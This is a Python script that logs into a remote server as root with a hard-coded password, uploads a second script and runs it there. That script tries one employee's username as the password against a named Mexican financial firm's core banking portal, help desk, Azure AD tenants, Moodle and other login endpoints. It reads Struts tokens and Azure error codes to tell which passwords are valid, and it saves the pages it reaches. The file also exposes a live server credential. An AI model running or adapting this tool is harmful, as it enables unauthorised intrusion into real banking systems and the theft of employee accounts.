import paramiko, sys, time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = """
import requests, urllib3, json, sys, time, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.111 Safari/537.36"

# ========================================
# CORE BANKING — afigueroac:afigueroac
# ========================================

TARGETS = [
    ("https://core.findep.mx", "core.findep.mx"),
    ("http://core.findep.mx", "core.findep.mx HTTP"),
    ("https://core.findep.mx:8443", "core 8443"),
    ("https://core.findep.com.mx", "core.findep.com.mx"),
]

for base, label in TARGETS:
    sys.stdout.write("\\n=== " + label + " ===\\n")
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA})
    
    # Step 1: GET login page
    try:
        r = s.get(base + "/core/index.jsp", timeout=15, allow_redirects=True)
        sys.stdout.write("  GET /core/index.jsp: [" + str(r.status_code) + "] " + str(len(r.text)) + "b\\n")
        
        # Extract form fields
        action = ""
        act_m = re.search(r'action=["\\'](.*?)["\\']', r.text, re.I)
        if act_m:
            action = act_m.group(1)
            sys.stdout.write("  Form action: " + action + "\\n")
        
        hidden_fields = dict(re.findall(r'<input[^>]*type=["\\']*hidden["\\']*[^>]*name=["\\'](.*?)["\\'"][^>]*value=["\\'](.*?)["\\'"]', r.text, re.I))
        hidden_fields.update(dict(re.findall(r'<input[^>]*name=["\\'](.*?)["\\'"][^>]*value=["\\'](.*?)["\\'"][^>]*type=["\\']*hidden', r.text, re.I)))
        sys.stdout.write("  Hidden fields: " + json.dumps(hidden_fields)[:200] + "\\n")
        
        # Check for Struts token
        struts_token = ""
        st_m = re.search(r'name=["\\']*org\\.apache\\.struts\\.taglib\\.html\\.TOKEN["\\']*\\s+value=["\\'](.*?)["\\'"]', r.text)
        if not st_m:
            st_m = re.search(r'name=["\\']*token["\\']*\\s+value=["\\'](.*?)["\\'"]', r.text, re.I)
        if st_m:
            struts_token = st_m.group(1)
            sys.stdout.write("  Struts token: " + struts_token + "\\n")
        
        # Look for login form structure
        forms = re.findall(r'<form[^>]*>(.*?)</form>', r.text, re.S | re.I)
        for fi, form in enumerate(forms):
            inputs = re.findall(r'name=["\\'](.*?)["\\'"]', form)
            sys.stdout.write("  Form " + str(fi) + " inputs: " + str(inputs)[:200] + "\\n")
        
        sys.stdout.write("  Title: ")
        tm = re.search(r'<title>(.*?)</title>', r.text, re.I | re.S)
        if tm:
            sys.stdout.write(tm.group(1).strip()[:80] + "\\n")
        else:
            sys.stdout.write("(none)\\n")
        
        # Cookies after GET
        sys.stdout.write("  Cookies: " + str(dict(s.cookies))[:200] + "\\n")
        
    except Exception as e:
        sys.stdout.write("  GET ERR: " + str(e)[:80] + "\\n")
        continue
    
    # Step 2: POST login
    sys.stdout.write("\\n  --- LOGIN ATTEMPT ---\\n")
    
    # Try multiple field name combos
    login_payloads = [
        {"usuario": "afigueroac", "password": "afigueroac"},
        {"username": "afigueroac", "password": "afigueroac"},
        {"user": "afigueroac", "pass": "afigueroac"},
        {"j_username": "afigueroac", "j_password": "afigueroac"},
        {"login": "afigueroac", "clave": "afigueroac"},
        {"txtUsuario": "afigueroac", "txtPassword": "afigueroac"},
    ]
    
    # Add hidden fields to first payload
    for lp in login_payloads:
        full_payload = dict(hidden_fields)
        full_payload.update(lp)
        if struts_token:
            full_payload["org.apache.struts.taglib.html.TOKEN"] = struts_token
        
        post_url = base + (action if action.startswith("/") else "/core/" + action) if action else base + "/core/index.jsp"
        
        try:
            r_post = s.post(post_url, data=full_payload, timeout=15, allow_redirects=True)
            sz = len(r_post.text)
            
            # Analyze response
            is_login_page = "password" in r_post.text[:5000].lower() and "login" in r_post.text[:5000].lower()
            has_error = "error" in r_post.text[:3000].lower() or "invalid" in r_post.text[:3000].lower() or "incorrecto" in r_post.text[:3000].lower()
            has_menu = "menu" in r_post.text.lower() or "dashboard" in r_post.text.lower() or "bienvenido" in r_post.text.lower() or "welcome" in r_post.text.lower()
            
            title = ""
            tm = re.search(r'<title>(.*?)</title>', r_post.text, re.I | re.S)
            if tm:
                title = tm.group(1).strip()[:80]
            
            sys.stdout.write("  POST " + str(list(lp.keys())) + " → [" + str(r_post.status_code) + "] " + str(sz) + "b")
            sys.stdout.write(" title='" + title + "'")
            if has_menu:
                sys.stdout.write(" *** POSSIBLE LOGIN OK ***")
            if has_error:
                sys.stdout.write(" [ERROR MSG]")
            sys.stdout.write("\\n")
            
            # If response is different from login page (9907 was login), might be in
            if sz != 9907 and not is_login_page and sz > 5000:
                sys.stdout.write("  >>> DIFFERENT RESPONSE — checking...\\n")
                sys.stdout.write("  Cookies: " + str(dict(s.cookies))[:200] + "\\n")
                sys.stdout.write("  URL: " + str(r_post.url)[:200] + "\\n")
                sys.stdout.write("  First 500 chars: " + r_post.text[:500].replace("\\n", " ") + "\\n")
                
                # Save full response
                with open("/root/core_afigueroac_" + "_".join(lp.keys()) + ".html", "w") as f:
                    f.write(r_post.text)
                
                if has_menu and not has_error:
                    sys.stdout.write("  *** LOGGED IN! SAVING FULL RESPONSE ***\\n")
                    break
            
        except Exception as e:
            sys.stdout.write("  POST ERR: " + str(e)[:60] + "\\n")
        time.sleep(0.5)
        sys.stdout.flush()

# ========================================
# Also try on FootPrints and other services
# ========================================
sys.stdout.write("\\n\\n=== FOOTPRINTS afigueroac ===\\n")
try:
    s2 = requests.Session()
    s2.verify = False
    s2.headers.update({"User-Agent": UA})
    r = s2.post("https://pao.findep.com.mx/MRcgi/MRlogin.pl",
        data={"USER":"afigueroac","PASSWORD":"afigueroac","USERID":"afigueroac",
              "MRSubmit":"Submit","PROJECTID":"1","LASTSTEP":"1"},
        timeout=15, allow_redirects=True)
    ok = "NAME=MRP" in r.text and "MRhomepage" in r.text
    cust = "CUSTUSER" in r.text
    if ok:
        sys.stdout.write("  *** FP LOGIN OK (" + ("CUST" if cust else "AGENT!") + ") ***\\n")
    else:
        sys.stdout.write("  FP FAIL (" + str(len(r.text)) + "b)\\n")
except Exception as e:
    sys.stdout.write("  FP ERR: " + str(e)[:60] + "\\n")

# Try Azure AD
sys.stdout.write("\\n=== AZURE AD afigueroac ===\\n")
for domain, tenant in [("findep.dev","d37bcda5-7136-468e-a984-4a47aa1468aa"),("findep.global","30fcec21-d05d-4ca6-8233-a90183fc7dbd"),("findep.com.mx","c5306fea-e13c-419e-adbe-e642c502de26")]:
    email = "afigueroac@" + domain
    try:
        r = requests.post("https://login.microsoftonline.com/" + tenant + "/oauth2/v2.0/token",
            data={"grant_type":"password","client_id":"1fec8e78-bce4-4aaf-ab1b-5451cc387264",
                  "username":email,"password":"afigueroac",
                  "scope":"https://graph.microsoft.com/.default"},
            timeout=10)
        ed = r.json().get("error_description","")[:100] if r.status_code != 200 else "HIT!"
        tag = ""
        if r.status_code == 200: tag = "*** HIT ***"
        elif "50053" in ed: tag = "[LOCKED]"
        elif "50034" in ed: tag = "[NOT FOUND]"
        elif "50126" in ed: tag = "[BAD PW]"
        elif "50076" in ed or "50079" in ed: tag = "[MFA-PW VALID!]"
        sys.stdout.write("  " + tag + " " + email + "\\n")
    except Exception as e:
        sys.stdout.write("  ERR " + email + " " + str(e)[:40] + "\\n")
    time.sleep(1)
    sys.stdout.flush()

# Try Moodle
sys.stdout.write("\\n=== MOODLE afigueroac ===\\n")
try:
    s3 = requests.Session()
    s3.verify = False
    s3.headers.update({"User-Agent": UA})
    r = s3.get("https://universidad.findep.mx/login/index.php", timeout=10)
    tok = re.search(r'name="logintoken"\\s+value="([^"]+)"', r.text)
    token = tok.group(1) if tok else ""
    r_login = s3.post("https://universidad.findep.mx/login/index.php",
        data={"username":"afigueroac","password":"afigueroac","logintoken":token},
        timeout=10, allow_redirects=True)
    if "Tablero" in r_login.text or "Dashboard" in r_login.text or "/my/" in str(r_login.url):
        sys.stdout.write("  *** MOODLE HIT ***\\n")
    else:
        sys.stdout.write("  Moodle FAIL\\n")
except Exception as e:
    sys.stdout.write("  Moodle ERR: " + str(e)[:40] + "\\n")

# PPP KHOR
sys.stdout.write("\\n=== PPP KHOR afigueroac ===\\n")
try:
    s4 = requests.Session()
    s4.verify = False
    s4.headers.update({"User-Agent": UA})
    r = s4.post("https://ppp.findep.mx/login", 
        data={"username":"afigueroac","password":"afigueroac"},
        timeout=10, allow_redirects=True)
    sys.stdout.write("  PPP [" + str(r.status_code) + "] " + str(len(r.text)) + "b url=" + str(r.url)[:80] + "\\n")
except Exception as e:
    sys.stdout.write("  PPP ERR: " + str(e)[:40] + "\\n")

# SIF
sys.stdout.write("\\n=== SIF afigueroac ===\\n")
try:
    r = requests.post("https://sif.findep.mx/api/login",
        json={"username":"afigueroac","password":"afigueroac"},
        headers={"User-Agent": UA}, verify=False, timeout=10)
    sys.stdout.write("  SIF [" + str(r.status_code) + "] " + str(len(r.text)) + "b " + r.text[:200] + "\\n")
except Exception as e:
    sys.stdout.write("  SIF ERR: " + str(e)[:40] + "\\n")

sys.stdout.write("\\n=== DONE ===\\n")
"""

sftp = ssh.open_sftp()
with sftp.open('/root/core_afigueroac.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

transport = ssh.get_transport()
channel = transport.open_session()
channel.exec_command('python3 -u /root/core_afigueroac.py 2>&1')
channel.settimeout(5)

start = time.time()
while time.time() - start < 120:
    try:
        if channel.recv_ready():
            chunk = channel.recv(8192).decode(errors='replace')
            sys.stdout.write(chunk)
            sys.stdout.flush()
        elif channel.exit_status_ready():
            while channel.recv_ready():
                chunk = channel.recv(8192).decode(errors='replace')
                sys.stdout.write(chunk)
                sys.stdout.flush()
            break
        else:
            time.sleep(0.3)
    except Exception:
        time.sleep(0.3)

print('\nFin.', flush=True)
ssh.close()
